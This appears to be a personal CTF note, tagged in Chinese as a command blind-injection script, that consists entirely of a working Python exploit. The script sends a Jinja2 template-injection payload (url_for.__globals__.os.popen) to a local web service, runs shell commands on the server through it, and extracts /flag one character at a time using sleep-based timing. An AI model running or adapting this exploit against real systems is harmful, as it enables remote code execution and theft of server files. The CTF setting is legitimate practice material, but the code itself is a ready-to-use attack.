---
创建: 2025-09-10
tags:
  - CTF/脚本/命令盲注
---
```python
import requests
import string

url = "http://127.0.0.1:24590/password=admin&username={{url_for.__globals__.os.popen('%s').read()}}"


def test(index: int, ch: str) -> bool:
    cmd = f'if [ `cat /flag | cut -c{str(index)}` = "{ch}" ]; then sleep 3; fi'
    res = requests.get(url % cmd)
    return res.elapsed.total_seconds() > 2


data_list = string.ascii_letters + string.digits + '-{}'

i = 1
res = ""

while True:
    for ch in data_list:
        if not test(i, ch):
            continue
        res += ch
        print(f"Flag: {res}")
        i += 1
        break
    if res.endswith("}"):
        break
```


